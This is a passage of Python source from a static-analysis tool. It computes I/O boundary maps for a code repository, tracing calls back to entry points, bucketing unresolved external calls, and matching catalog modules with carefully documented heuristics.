    leaf_callers: list[str] = field(default_factory=list)
    entry_points_per_leaf: dict[str, list[str]] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to JSON-friendly dict.

        Includes per-primitive counts, per-chain detail, and a
        high-risk flag indicating whether any chain uses a high-risk
        primitive (destructive fs, subprocess, outbound network).

        Also emits the WI-darad leaf-caller roll-ups (leaf_callers +
        entry_points_per_leaf) so taint-style reasoning can keep the
        EP→concrete-caller→sink association even when many concrete
        callers share a helper (the 'slack.Notify / discord.Notify /
        pushover.Notify → request → http.NewRequest' case).
        """
        prim_counts: dict[str, int] = {}
        for chain in self.chains:
            prim_counts[chain.primitive] = prim_counts.get(chain.primitive, 0) + 1
        return {
            "boundary": self.boundary,
            "chain_count": len(self.chains),
            "entry_points": self.entry_points,
            "primitives_used": self.primitives_used,
            "primitive_counts": prim_counts,
            "chains": [c.to_dict() for c in self.chains],
            "has_high_risk": any(
                is_high_risk(c.primitive) for c in self.chains
            ),
            "leaf_callers": self.leaf_callers,
            "entry_points_per_leaf": self.entry_points_per_leaf,
        }


@dataclass
class BoundaryMap:
    """Complete I/O boundary map for a repository.

    Attributes:
        entries: Mapping from boundary type to aggregated entry.
        total_io_edges: The REAL/verified I/O surface — chain count across
            confirmed boundary categories, EXCLUDING the ``external_potential``
            bucket. INV-pubom canonical definition (amended 2026-06-30 per the
            wave-3 ruling, WI-huhit/WI-foduh): ``sum(len(e.chains) for k, e in
            entries.items() if k != "external_potential")``. The prior
            definition INCLUDED external_potential, which on self-analysis is
            ~96% receiver-unresolved builtin method calls (append/get/split…) —
            not real I/O — so a consumer reading the headline as "I/O surface"
            over-counted ~28x. external_potential is now disclosed separately in
            ``external_potential_edges``. The unfiltered serializer
            (``BoundaryMap.to_dict``), the filtered ``cmd_io_boundaries`` JSON
            path, AND the text headline all agree on this real-categories count.
        external_potential_edges: Chain count of the ``external_potential``
            bucket (receiver-unresolved calls — potential, unverified I/O),
            disclosed separately so it does not inflate ``total_io_edges``.
        command_launch_edges: Chain count of the ``command_launch`` bucket
            (WI-javoh) — command-mediated external-program launches (a shell
            ``curl``/``git``/``rm`` etc.). Every launch IS a subprocess crossing
            (ADR-0016 §1 "all launches risky"), but the population is
            high-volume-and-low-per-command-signal on devops repos, so — by the
            same count-vs-disclose doctrine that excludes ``external_potential``
            — it is DISCLOSED here and EXCLUDED from ``total_io_edges`` rather
            than inflating the curated stdlib subprocess headline. Unlike
            ``external_potential`` these are NOT speculative: a lexed ``curl`` is
            a definite launch, just deliberately not counted in the verified
            catalog surface.
    """

    entries: dict[str, BoundaryMapEntry] = field(default_factory=dict)
    total_io_edges: int = 0
    external_potential_edges: int = 0
    command_launch_edges: int = 0

    def to_dict(self) -> dict[str, Any]:
        """Serialize to JSON-friendly dict.

        Top-level keys form the io-boundaries wire contract pinned by
        :data:`IO_BOUNDARIES_SCHEMA_VERSION`. Anyone adding/removing
        keys here must bump that constant; the property tests in
        ``test_io_boundary.py::TestIoBoundariesEnvelopeSchema`` will
        fire if the contract drifts silently.
        """
        return {
            "schema_version": IO_BOUNDARIES_SCHEMA_VERSION,
            "total_io_edges": self.total_io_edges,
            "external_potential_edges": self.external_potential_edges,
            "command_launch_edges": self.command_launch_edges,
            "boundaries": {
                k: v.to_dict() for k, v in sorted(self.entries.items())
            },
        }


# ADR-0023 §6 Phase 2 audit (WI-sahab-fatoz): this set holds
# relationship-axis values (``calls``, ``instantiates``, ``references``,
# ``module_attr_ref``, ``dispatches_to``). Forward-compatible through the
# endpoint_shape fold because ``calls`` is already a member, so when
# bridges fold into ``calls`` + ``meta["bridge_kind"]`` the set still
# matches. The folded gRPC RPC-implementation edge (``implements`` +
# ``meta['protocol']='grpc'``, audit-findings 0016) is matched by the
# is_grpc_rpc_implementation predicate (``_is_traceable_edge``), not by
# membership.
_TRACEABLE_EDGE_TYPES = frozenset({
    "calls", "instantiates", "dispatches_to", "references",
    # WI-guhok: attribute reads of imported modules (e.g. os.environ, sys.argv)
    # — lets IO-primitive ``attributes:`` YAML entries become reachable from
    # the taint-style backward BFS that computes entry-point chains.
    "module_attr_ref",
    # audit-findings 0002 (WI-hahap-farid): ipc_event / message_send / websocket_message
    # / message_queue all fold to event_publishes; bringing the canonical
    # name in keeps the reverse-graph traversal crossing async-channel
    # boundaries after the IPC family rename.
    "event_publishes",
    # Protocol-call family (WI-vumum-juvil) folds to 'calls' +
    # meta['protocol'], so HTTP/gRPC/GraphQL call traversals transfer via
    # the canonical 'calls' member. implements_rpc folded to 'implements'
    # + meta['protocol']='grpc' (audit-findings 0016) — matched by the
    # is_grpc_rpc_implementation predicate via _is_traceable_edge below,
    # NOT a set member (that would include every structural 'implements').
})


def _is_traceable_edge(edge: Any) -> bool:
    """True if *edge* (an ``Edge``) is traceable for I/O-boundary reachability.

    Membership in :data:`_TRACEABLE_EDGE_TYPES`, OR the folded gRPC
    RPC-implementation edge (``implements`` + ``meta['protocol']='grpc'``,
    audit-findings 0016) — the one place io_boundary recognizes the folded
    form, preserving gRPC reachability without over-including structural
    ``implements`` edges.
    """
    return edge.edge_type in _TRACEABLE_EDGE_TYPES or is_grpc_rpc_implementation(
        edge.edge_type, edge.meta
    )


def _build_reverse_graph(edges: list[Edge]) -> dict[str, set[str]]:
    """Build reverse adjacency list (callee → callers) over traceable edge types.

    Includes FFI bridge edges so upstream walks cross language boundaries
    (e.g., Java native method → C JNI function → fopen).
    """
    reverse_graph: dict[str, set[str]] = {}
    for edge in edges:
        if _is_traceable_edge(edge):
            reverse_graph.setdefault(edge.dst, set()).add(edge.src)
    return reverse_graph


def _reachable_entry_points(
    seed: str,
    reverse_graph: dict[str, set[str]],
    entrypoint_ids: set[str],
) -> set[str]:
    """BFS backward from ``seed`` and return all entrypoints reachable."""
    reachable_eps: set[str] = set()
    visited: set[str] = set()
    queue = [seed]
    while queue:
        current = queue.pop(0)
        if current not in visited:
            visited.add(current)
            if current in entrypoint_ids:
                reachable_eps.add(current)
            for caller in reverse_graph.get(current, ()):
                if caller not in visited:
                    queue.append(caller)
    return reachable_eps


def _compute_external_potential(
    edges: list[Edge],
    catalogs: dict[str, IoBoundaryCatalog],
    nodes_by_id: dict[str, dict[str, Any]],
    ep_map: dict[str, set[str]],
) -> list[IoChain]:
    """Synthesize ``external_potential`` IoChains for unmatched boundary edges.

    Plan C, PR C: for every edge whose ``meta.io_boundary`` is unset
    (so the catalog did not classify it) and whose dst is a synthetic
    external-boundary node (``meta.external_boundary == True``), emit a
    chain into the ``external_potential`` bucket so the user sees
    "first-party code reaches into untrusted territory" as a first-class
    signal.

    Filters:
    - Only edge types in :data:`_TRACEABLE_EDGE_TYPES` (same set the
      reverse-graph uses).
    - The dst MUST be in ``nodes_by_id`` AND be marked
      ``meta.external_boundary``.
    - The source language MUST have a loaded catalog
      (``catalog.is_supported``); we don't speculate about languages
      we can't classify at all.
    - The composed primitive name (``module.name`` from the dst ID) MUST
      NOT be in the catalog's ``stdlib_other`` set — those are stdlib
      symbols we know are not IO, so they aren't catalog gaps.

    Annotation:
    - When the source language's catalog is ``status: in_progress``,
      ``dst_classification_unreliable=True`` is set on each chain.
      (Suppressing the chain entirely would silently hide data; the
      annotation lets users see them while knowing the absence-of-
      catalog-hit isn't authoritative.)
    """
    chains: list[IoChain] = []
    for edge in edges:
        meta = edge.meta
        if meta and meta.get("io_boundary"):
            continue
        if not _is_traceable_edge(edge):
            continue
        dst_node = nodes_by_id.get(edge.dst)
        if dst_node is None:
            continue
        dst_meta = dst_node.get("meta") or {}
        if not dst_meta.get("external_boundary"):
            continue

        # F3 Filter 1: unresolved-receiver skip.
        # Per ADR-0028, ``Edge.is_resolved`` is False for edges whose dst
        # symbol could not be resolved at analysis time — i.e., a
        # speculative external target. These dominate the
        # external_potential bucket on self-analysis (~4,521 chains on
        # hypergumbo) and report low-signal "we don't know what this is"
        # rather than "first-party code reaches an audited boundary."
        # ``getattr`` with a True default keeps legacy edge objects
        # (and pre-ADR-0028 mock edges) behaving as before.
        if not getattr(edge, "is_resolved", True):
            continue

        src_parts = edge.src.split(":")
        src_lang = src_parts[0] if src_parts else ""
        catalog = catalogs.get(src_lang)
        if catalog is None or not catalog.is_supported:
            continue

        # Compose primitive name from module hint + dst name. Module hint
        # is the most useful disambiguator (huggingface_hub.snapshot_download
        # vs anything.snapshot_download); name alone would collapse them.
        # WI-tihup: prefer the structured ExternalRef when present —
        # it's the canonical source of truth for external-target edges
        # and bypasses the legacy colon-split heuristic. Use getattr so
        # MockEdge-style test doubles without the dst_ref attribute fall
        # through cleanly.
        edge_dst_ref = getattr(edge, "dst_ref", None)
        if edge_dst_ref is not None:
            module_hint = edge_dst_ref.module_path
            dst_name = dst_node.get("name") or edge_dst_ref.name
        else:
            module_hint = _extract_module_hint(edge.dst) or ""
            dst_name = dst_node.get("name") or _extract_callee_name(edge.dst)
        # F3 Filter 3: composition fix. When the dst node's ``name``
        # field already carries the module-qualified form (e.g.
        # ``re.MULTILINE``) and the extracted module_hint is the same
        # module (``re``), the naive prepend produces ``re.re.MULTILINE``.
        # ``ast.ast.Name``, ``os.os.path``, ``datetime.datetime.now`` are
        # the most reader-visible cases. Skip the prepend when the
        # qualified form is already present.
        if module_hint and module_hint != "external":
            prefix = f"{module_hint}."
            if dst_name.startswith(prefix):
                primitive = dst_name
            else:
                primitive = f"{module_hint}.{dst_name}"
        else:
            primitive = dst_name

        # Filter out stdlib non-IO symbols — those aren't catalog gaps.
        if primitive in catalog.stdlib_other:
            continue

        # F3 PR-C Filter 2: closed-world stdlib skip, per-module gated.
        # When ``module_hint`` is non-empty AND the catalog has flagged
        # that exact module as ``completeness: complete`` (meaning we've
        # audited every I/O primitive it exposes), an unmatched call into
        # the module is provably NOT I/O — so suppress the
        # external_potential chain. Modules not flagged complete fall
        # through to the previous behavior: chain emitted, user can
        # still see catalog gaps. ``module_hint`` is the structured
        # source (``edge.dst_ref.module_path`` when available, else the
        # colon-split fallback) computed earlier in this function.
        if module_hint and catalog.module_io_is_enumerated(module_hint):
            continue

        sc = dst_node.get("supply_chain") or {}
        chain = IoChain(
            boundary="external_potential",
            primitive=primitive,
            io_edge_src=edge.src,
            io_edge_dst=edge.dst,
            entry_points=sorted(ep_map.get(edge.src, set())),
            dst_tier=sc.get("tier"),
            dst_tier_name=sc.get("tier_name"),
            dst_external_boundary=True,
            dst_classification_unreliable=(catalog.status == "in_progress"),
        )
        chains.append(chain)
    return chains


def compute_boundary_map(
    edges: list[Edge],
    catalogs: dict[str, IoBoundaryCatalog],
    *,
    entrypoint_ids: set[str] | None = None,
    nodes_by_id: dict[str, dict[str, Any]] | None = None,
) -> BoundaryMap:
    """Compute the I/O boundary map from a set of edges.

    Tags edges with I/O boundary metadata (in-place), then aggregates
    tagged edges by boundary type. When ``entrypoint_ids`` is provided,
    traces backward from each IO edge through the call graph to find
    which entrypoints can reach each IO call.

    Args:
        edges: List of Edge objects (mutated: io_boundary metadata stamped).
        catalogs: Language → IoBoundaryCatalog mapping.
        entrypoint_ids: Optional set of entrypoint symbol IDs. When
            provided, populates ``entry_points`` on each IoChain and
            BoundaryMapEntry.
        nodes_by_id: Optional ``{symbol_id: node_dict}`` lookup. When
            provided, each IoChain picks up the dst symbol's
            ``supply_chain.tier`` / ``tier_name`` and ``meta.external_boundary``
            so downstream consumers (verify-claims, sketch) can distinguish
            "first-party calls first-party I/O" from "first-party calls
            tier-3 wrapper that may reach the network." Pre-PR1 JSON
            files lack boundary nodes; in that case the dst lookup yields
            ``None`` and chain.dst_tier stays ``None`` (backwards-compat).

    Returns:
        BoundaryMap with per-boundary-type aggregation.
    """
    # Phase 1b side effect: tag boundary-bearing edges in place. INV-pubom
    # closure: ``total_io_edges`` on the returned ``BoundaryMap`` is the
    # post-external_potential chain count (computed below), NOT the
    # pre-external_potential ``tagged_count`` this call returns.
    tag_io_boundaries(edges, catalogs)

    # Reverse call graph — shared by EP tracing and leaf-caller expansion
    reverse_graph = _build_reverse_graph(edges)

    # Reverse-trace from IO edges to entrypoints (Phase 1c)
    ep_map: dict[str, set[str]] = {}
    if entrypoint_ids:
        io_sources: set[str] = set()
        for edge in edges:
            if edge.meta and edge.meta.get("io_boundary"):
                io_sources.add(edge.src)
        for io_src in io_sources:
            ep_map[io_src] = _reachable_entry_points(
                io_src, reverse_graph, entrypoint_ids
            )

    # Aggregate tagged edges by boundary type
    by_boundary: dict[str, list[IoChain]] = {}
    for edge in edges:
        meta = edge.meta
        if meta is None:
            continue
        boundary = meta.get("io_boundary")
        if boundary is None:
            continue
        primitive = meta.get("io_primitive", "")
        chain_eps = sorted(ep_map.get(edge.src, set()))
        # Tier lookup on the dst Symbol — only available when the caller
        # passed nodes_by_id and the dst is in the lookup. PR1 of the
        # stop-stripping plan ensures boundary nodes are now in
        # behavior_map["nodes"] so this resolves for previously-dangling
        # external dsts too.
        dst_tier: Optional[int] = None
        dst_tier_name: Optional[str] = None
        dst_external = False
        if nodes_by_id is not None:
            dst_node = nodes_by_id.get(edge.dst)
            if dst_node is not None:
                sc = dst_node.get("supply_chain") or {}
                dst_tier = sc.get("tier")
                dst_tier_name = sc.get("tier_name")
                dst_meta = dst_node.get("meta") or {}
                dst_external = bool(dst_meta.get("external_boundary"))
        # INV-zumin: ONE CHAIN PER SIMULTANEOUSLY-TRUE BOUNDARY. Chains are what
        # a ``must_not_exist`` claim counts, and they were built from the single
        # ``io_boundary`` string — so reaching both declarations in the
        # catalogue was necessary and not sufficient, and the scala launch
        # stayed undetectable as a subprocess however the rows were written.
        # ``io_boundaries`` is absent for every primitive that is not
        # simultaneously true, so this falls back to exactly one chain and the
        # ~99% of the corpus that is single-boundary pays nothing.
        for chain_boundary in (meta.get("io_boundaries") or [boundary]):
            by_boundary.setdefault(chain_boundary, []).append(IoChain(
                boundary=chain_boundary,
                primitive=primitive,
                io_edge_src=edge.src,
                io_edge_dst=edge.dst,
                entry_points=chain_eps,
                dst_tier=dst_tier,
                dst_tier_name=dst_tier_name,
                dst_external_boundary=dst_external,
            ))

    # Plan C, PR C: external_potential second pass.  Synthesize chains
    # for unmatched edges whose dst is a synthetic external-boundary
    # node — i.e., first-party code reaches into untrusted territory
    # the catalog doesn't classify.  Surfaces the structural answer to
    # "the catalog can't enumerate every popular wrapper": instead of
    # adding entries for huggingface_hub / requests / okhttp / etc., the
    # bucket emits one chain per such call so the user can see the
    # surface area as a first-class signal.
    if nodes_by_id is not None:
        ext_chains = _compute_external_potential(
            edges, catalogs, nodes_by_id, ep_map,
        )
        if ext_chains:
            by_boundary["external_potential"] = ext_chains

    # Build boundary map entries, including WI-darad leaf-caller roll-ups.
    # INV-pubom canonical definition (amended 2026-06-30 per the wave-3 ruling,
    # WI-huhit/WI-foduh): ``total_io_edges`` is the REAL/verified I/O surface —
    # the chain count across confirmed boundary categories, EXCLUDING the
    # ``external_potential`` bucket (receiver-unresolved calls; ~96% builtin
    # method noise on self-analysis, not real I/O). ``external_potential_edges``
    # discloses that bucket separately so it no longer inflates the headline.
    # Both the unfiltered (``BoundaryMap.to_dict``) and the filtered
    # (``cmd_io_boundaries``) JSON paths — and the text headline — agree on this
    # real-categories count; see the writer-contract validator for the runtime
    # check.
    leaf_ep_cache: dict[str, set[str]] = {}
    entries: dict[str, BoundaryMapEntry] = {}
    for boundary, chains in by_boundary.items():
        leaf_callers, entry_points_per_leaf = compute_leaf_rollups(
            chains, reverse_graph, entrypoint_ids, leaf_ep_cache,
        )
        entries[boundary] = BoundaryMapEntry(
            boundary=boundary,
            chains=chains,
            entry_points=sorted({ep for c in chains for ep in c.entry_points}),
            primitives_used=sorted({c.primitive for c in chains}),
            leaf_callers=leaf_callers,
            entry_points_per_leaf=entry_points_per_leaf,
        )
    ep_edges = (
        len(entries["external_potential"].chains)
        if "external_potential" in entries
        else 0
    )
    cl_edges = (
        len(entries["command_launch"].chains)
        if "command_launch" in entries
        else 0
    )
    bmap = BoundaryMap(
        entries=entries,
        total_io_edges=sum(
            len(e.chains) for k, e in entries.items()
            if k not in _DISCLOSED_ONLY_BOUNDARIES
        ),
        external_potential_edges=ep_edges,
        command_launch_edges=cl_edges,
    )

    return bmap


def compute_leaf_rollups(
    chains: list[IoChain],
    reverse_graph: dict[str, set[str]],
    entrypoint_ids: Optional[set[str]] = None,
    leaf_ep_cache: Optional[dict[str, set[str]]] = None,
) -> tuple[list[str], dict[str, list[str]]]:
    """Compute the WI-darad leaf-caller roll-ups for a chain set.

    A "leaf caller" of an io_edge_src is an immediate caller of that src
    in the reverse graph; when src has no callers, src itself is its own
    leaf (the primitive is invoked directly from that function).

    Exposed at module level so the CLI's filter pass (cmd_io_boundaries)
    can recompute rollups for a subset of chains after dropping test-file
    chains or applying --primitive — otherwise the BoundaryMapEntry it
    rebuilds loses the rollups, and the bakeoff io-boundaries.txt shows
    chain_count>0 with leaf_callers=[] (WI-rubir regression).

    ``leaf_ep_cache`` lets callers reuse entry-point reachability sets
    across multiple boundary types in the same map; pass ``None`` to use
    a per-call scratch cache.
    """
    if leaf_ep_cache is None:
        leaf_ep_cache = {}
    leaf_set: set[str] = set()
    per_leaf: dict[str, set[str]] = {}
    for chain in chains:
        callers = reverse_graph.get(chain.io_edge_src, set())
        leaves = callers if callers else {chain.io_edge_src}
        for leaf in leaves:
            leaf_set.add(leaf)
            if entrypoint_ids:
                if leaf not in leaf_ep_cache:
                    leaf_ep_cache[leaf] = _reachable_entry_points(
                        leaf, reverse_graph, entrypoint_ids
                    )
                per_leaf.setdefault(leaf, set()).update(leaf_ep_cache[leaf])
    return (
        sorted(leaf_set),
        {leaf: sorted(eps) for leaf, eps in per_leaf.items()},
    )


# ---------------------------------------------------------------------------
# Boundary-tagging pass (ADR-0016 Phase 1b)
# ---------------------------------------------------------------------------


def _module_matches(catalog_module: str, edge_module_hint: str) -> bool:
    """Check if a catalog entry's module matches the edge's module hint.

    Matching is COMPONENT-AWARE, not substring (WI-zazul):
    - Go: catalog has ``net.Conn``, edge has ``net.Conn`` → match
    - Go: catalog has ``os``, edge has ``os`` → match
    - Go: catalog has ``net.Conn``, edge has ``crypto/rand`` → no match
    - Go: catalog has ``os/exec``, edge has ``os.exec.Cmd`` → match (a TYPE)
    - Go: catalog has ``net/http``, edge has ``net/http/fcgi`` → no match
      (a SIBLING PACKAGE, and fcgi.Get is not net/http.Get)
    - Rust: catalog has ``std::fs``, edge has ``std::fs::File`` → match
    - Java: catalog has ``java.io``, edge has ``java.io.FileInputStream`` → match
    - Java: catalog has ``java.lang.System``, edge has ``System`` → match
      (unqualified reference — a component SUFFIX, not a prefix)
    - Go: catalog has ``net/http``, edge has ``http`` → match (same reason:
      source spells it ``http.Get`` after importing ``net/http``)
    - Swift: catalog has ``Channel``, edge has ``channel`` → match
    - Swift: catalog has ``ChannelHandlerContext``, edge has ``context`` → match
    - Swift: catalog has ``NonBlockingFileIO``, edge has ``fileIO`` → match

    WHY NOT SUBSTRING. This used to be ``cm in em or em in cm`` after folding
    ``::`` and ``/`` into ``.``. Twenty-five of the 210 catalog sink modules are
    four characters or fewer (``os``, ``io``, ``fs``, ``net``, ``log``, ``sys``,
    ``rpc``, ``ssl`` …), so each one matched any module whose normalised path
    merely *contained* it: ``os`` matched ``chaos``, ``log`` matched ``dialog``,
    and a module path ending in ``grpc`` matched the ``grpc`` catalog entry. On
    fresh substrate that produced non-realizable sinks — d3's ``log`` (the
    logarithm) reported as a logging sink, and ``net/http/httptest.NewRequest``,
    the *test* request constructor which performs no network IO, reported as a
    network sink.

    WHY CAPITALISATION DECIDES THE STRICT-PREFIX CASE. The obvious fix — keep
    ``/`` distinct from ``.`` so a package path can never be confused with a
    member — does not work here, because the Go analyzer emits ``os.exec.Cmd``
    for what the catalog spells ``os/exec``. The separator is therefore not
    reliable evidence of a package boundary. What *is* reliable is Go's naming
    convention: package names are lowercase, exported type names are
    capitalised. So when one side is a strict component-prefix of the other, the
    first extra component decides — ``Cmd``/``File``/``FileInputStream`` name a
    type inside the matched module, while ``fcgi``/``httptest``/``smtp`` name a
    different module.

    DIRECTION IS THE SAFETY PROPERTY OF THE SWIFT CARVE-OUT. Swift hints are
    receiver *variable* names (camelCase) against PascalCase catalog types, and
    the variable is often the type's trailing word — ``fileIO`` for
    ``NonBlockingFileIO``. Component matching cannot express that, so it is an
    explicit carve-out restricted to the case where the CATALOG name ends with
    the HINT. The reverse direction is precisely the bug: ``chaos`` ends with
    ``os``. The suffix must also start on a capital, so it names a whole word
    rather than landing mid-token.

    Known tradeoff, stated rather than discovered later: a lowercase extra
    component now blocks a match even in languages that do not signal
    types by case, so this can UNDER-match where it previously over-matched.
    That is the safe direction for a sink catalog — a missed sink is a gap, a
    spurious one is a false claim about the program's behaviour.
    """
    # Normalize separators, but keep the raw (unfolded) components too: the
    # strict-prefix rule needs original capitalisation to tell a type from a
    # sub-package.
    cm_parts_raw = catalog_module.replace("::", ".").replace("/", ".").split(".")
    em_parts_raw = edge_module_hint.replace("::", ".").replace("/", ".").split(".")
    cm_parts = [p.casefold() for p in cm_parts_raw]
    em_parts = [p.casefold() for p in em_parts_raw]

    if cm_parts == em_parts:
        return True

    shared = min(len(cm_parts), len(em_parts))
    if cm_parts[:shared] == em_parts[:shared]:
        # One is a strict component-prefix of the other. The first extra
        # component is either a type inside the matched module (match) or a
        # different module that merely shares a prefix (no match).
        longer_raw = (
            em_parts_raw if len(em_parts) > len(cm_parts) else cm_parts_raw
        )
        if longer_raw[shared][:1].isupper():
            return True

    # Dropped qualification: one side is a component-SUFFIX of the other. This
    # is how source code normally spells these — Go writes `http.Get` after
    # importing `net/http`, and Java writes `System.in` for
    # `java.lang.System.in`, so the hint is routinely the unqualified tail of
    # the catalog's fully-qualified module. No capitalisation test applies
    # here: the extra components are leading NAMESPACE, and dropping a
    # namespace cannot turn one module into a different one the way appending
    # a sub-package can. Whole components still have to match, which is what
    # keeps `os`/`chaos` and `grpc`/`…otlptracegrpc` rejected.
    if cm_parts[-shared:] == em_parts[-shared:]:
        return True

    # Swift receiver-variable carve-out: single-token names only, catalog ends
    # with hint (never the reverse), and the suffix starts on a word boundary.
    if len(cm_parts) == 1 and len(em_parts) == 1:
        cm, em = cm_parts[0], em_parts[0]
        if len(em) < len(cm) and cm.endswith(em):
            return cm_parts_raw[0][len(cm) - len(em)].isupper()

    return False


#: Dst kinds meaning "this call resolved to a callable DEFINED IN THE ANALYSED REPO".
#:
#: SCOPED BY MEASUREMENT, NOT BY CAUTION, and the scope is the load-bearing part.
#: ``variable`` is deliberately absent: express reaches the real ``path.dirname`` through
#: ``var dirname = path.dirname``, an alias binding where the catalogue tag is CORRECT,
#: and 11 of its tagged boundaries are of exactly that shape. Refusing every first-party
#: dst would have deleted them. ``attribute`` is absent for the same reason (``os.environ``
#: and friends reach the pipeline as ``module_attr_ref`` edges).
#:
#: Blast radius, measured before this gate moved rather than after: across hypergumbo,
#: poetry, caddy and express every currently-tagged boundary carries a dst kind of
#: ``unresolved``, ``attribute``, ``variable`` or ``symbol`` — not one carries
#: ``function`` or ``method``. So this removes zero boundaries that exist today. That
#: check was not optional: gating the hinted path with :func:`gate_named_entry` once
#: destroyed 61.5-87.2% of real boundaries for zero gain.
#:
#: Both names are registered ADR-0027 symbol kinds, asserted by
#: ``test_io_boundary_first_party_attribution.py``, so this cannot drift into a private
#: vocabulary.
FIRST_PARTY_CALLABLE_KINDS: frozenset[str] = frozenset({"function", "method"})


def is_first_party_callable_dst(edge_dst: str) -> bool:
    """Did this call resolve to a callable defined inside the analysed repository?

    THE SINGLE ANSWER to that question, consumed by every place that maps an edge onto a
    catalogue entry. The catalogue describes EXTERNAL primitives; a first-party function
    that merely shares a short name with one is a different function, and attributing the
    primitive to it is a false report — of a filesystem write, or (worse) of a subprocess
    launch, the one boundary flagged ``*** HIGH RISK ***`` on the invariant that launching
    an external program is arbitrary code execution. A write-side primitive also
    auto-derives a taint sink (ADR-0017 §2b), so the false attribution propagates into
    claim verdicts rather than staying cosmetic.

    WHY THE KIND SLOT AND NOT THE PATH. The defect this closes reaches the ungated branch
    because :func:`_extract_module_hint` returns ``None`` for a module slot beginning
    ``/`` — its docstring has the right intent ("a file path is not a useful module
    hint") but implements only the ABSOLUTE case, and the CLI resolves the repo root, so
    production always takes it. Tightening that heuristic to catch relative paths too
    would fix the symptom in a way that stays a heuristic: Rust is currently clean ONLY
    because it emits a relative module slot, which is returned as a hint and then fails
    ``_module_matches`` — the right outcome for the wrong reason, and one that would
    evaporate silently if Rust ever emitted absolute paths. The kind slot answers the
    real question directly and is language-agnostic and path-format independent.

    WHAT THIS DOES *NOT* AUTHORISE, learned by getting it wrong first. A ``True`` here
    withholds ONLY the ungated short-name fallback. It does not skip the edge, because
    the kind slot does not by itself separate first-party from external: 50 existing
    tests model a RESOLVED external primitive as
    ``python:/stdlib/os.py:100-102:os.listdir:function`` — a real stdlib call with a
    file-path module slot and a ``function`` kind — and every one of them broke when
    this refusal was applied at the top of the tagging loop. They were right to break.
    Such an edge still carries its module-qualified NAME, so the exact-qualified match
    identifies it correctly; only a bare, unqualified, hint-less short name is ambiguous,
    and that is the single path this gates.

    Returns ``False`` for any dst that does not carry the five-slot shape. An unprovable
    claim of first-partyness must not suppress a boundary — the safe default here is to
    let the existing gates decide, not to invent a refusal.
    """
    parts = edge_dst.split(":")
    if len(parts) < 5:
        return False
    if parts[-1] not in FIRST_PARTY_CALLABLE_KINDS:
        return False
    # BOTH signals are required, and the second one is not belt-and-braces — the kind
    # slot alone is NOT a first-party marker. Haskell emits its external placeholders as
    # ``haskell:external:0-0:readFile:function``: module slot ``external``, kind
    # ``function``. Keying on kind alone silently un-tagged ``readFile``/``writeFile``
    # there, which is a FALSE NEGATIVE in a security tool — the expensive direction, and
    # exactly what this predicate exists to avoid causing. (That the kind slot carries a
    # different vocabulary across emission paths is INV-kurup's territory, not something
    # to paper over here.) So the module slot must also name a filesystem location, which
    # is what a resolved in-repo symbol carries and what neither a module path (``os``,
    # ``std::fs``) nor the ``external`` placeholder ever does.
    module_slot = parts[1]
    return module_slot.startswith(("/", "\\"))


def _extract_module_hint(edge_dst: str) -> str | None:
    """Extract the module hint from an edge destination symbol ID.

    For unresolved edges with format ``{lang}:{module_hint}:0-0:{name}:unresolved``,
    returns the module_hint part — which is the PATH slot, so it is read through
    :func:`ir.symbol_path_slot` rather than parsed here (INV-fokik).

    THIS USED TO BE ``parts[1]``, and that is wrong whenever the path slot carries
    colons — which ADR-0036 Ruling 1 explicitly permits, and which every one of
    Rust's nine catalogued sink modules does. ``rust:std::env:0-0:var:...`` returned
    ``std``; ``_module_matches("std::env", "std")`` is False; and
    ``_lookup_named_entry`` treats a present-but-MISMATCHED module as a REJECTION
    rather than a degrade, so the finding was dropped in silence. Measured at 740
    ids across two Rust repos plus hypergumbo's own tree. Adding an eighth private
    parse was the alternative — WI-ribuz counts six homes and three mechanisms
    already, two of them naive in exactly this way.

    For resolved edges (file paths in position 2), returns None since the
    path is not a useful module hint.
    """
    candidate = symbol_path_slot(edge_dst)
    if not candidate:
        return None
    # Heuristic: file paths start with / or contain .py/.java/.go etc.
    # Module hints are identifiers like "external", "net.Conn", "os"
    if candidate.startswith("/") or candidate.startswith("\\"):
        return None
    return candidate


def _extract_callee_name(edge_dst: str) -> str:
    """Extract a callable name from an edge destination symbol ID.

    Symbol IDs have the format ``language:path:span:name:kind``.  The *name*
    field may itself contain colons (e.g., Objective-C selectors like
    ``removeItemAtPath:error:``).

    Delegates to :func:`ir.symbol_name_slot` (INV-fokik). The previous strategy —
    "split off kind from the right, then take everything after the first three
    fields" — handled a colon-bearing NAME but assumed a colon-free PATH, and
    ADR-0036 Ruling 1 makes the path the one colon-TOLERANT slot. On
    ``rust:std::fs:0-0:write:external_symbol`` it returned ``fs:0-0:write``, so
    every one of Rust's nine colon-bearing sink modules missed its catalogue row.
    That miss is silent, which is why it survived a corpus A/B: correcting the
    module hint alone moved zero boundaries because this function had already
    destroyed the name.
    """
    name = symbol_name_slot(edge_dst)
    if name:
        return name
    # Fewer than five fields — return the last segment (handles minimal IDs
    # like "a:b"), preserving this function's pre-chokepoint contract.
    return edge_dst.rsplit(":", 1)[0] if ":" in edge_dst else edge_dst


def _resolve_ffi_catalog(
    lang: str,
    module_hint: str | None,
    catalogs: dict[str, "IoBoundaryCatalog"],
) -> tuple["IoBoundaryCatalog | None", str | None]:
    """Redirect FFI pseudo-namespace lookups to the actual target catalog.

    Go's cgo pseudo-package ``C`` produces edges like
    ``go:C:0-0:fopen:unresolved`` when calling C stdlib functions.  The
    ``go`` catalog contains Go-native IO (``os.Open``, ``net.Listen``),
    not C stdlib entries.  This function detects the ``go:C:`` prefix
    and redirects to the ``c`` catalog, dropping the module hint because
    ``"C"`` is Go's import alias, not a C header/module name.

    Python's pyffi linker uses ``python:C_stdlib:0-0:<name>:unresolved``
    for calls through ``ctypes.CDLL(None)`` or ``ffi.dlopen(None)``.
    Same redirect: the ``python`` catalog has Python-native IO, but these
    calls target C stdlib functions.

    Returns:
        (catalog, adjusted_module_hint) — the catalog to use for lookup
        and the module hint (``None`` when the pseudo-namespace module
        is not a real module in the target language).
    """
    # Go cgo → C stdlib: go:C:0-0:<name>:unresolved
    if lang == "go" and module_hint == "C":
        return catalogs.get("c"), None

    # Python ctypes.CDLL(None) / ffi.dlopen(None) → C stdlib
    if lang == "python" and module_hint == "C_stdlib":
        return catalogs.get("c"), None

    # Ruby FFI gem attach_function → C stdlib/external lib
    if lang == "ruby" and module_hint == "C_ffi":
        return catalogs.get("c"), None

    return catalogs.get(lang), module_hint


def classify_call(
    catalogs: dict[str, IoBoundaryCatalog],
    dst: str,
    meta: Optional[dict[str, Any]] = None,
    *,
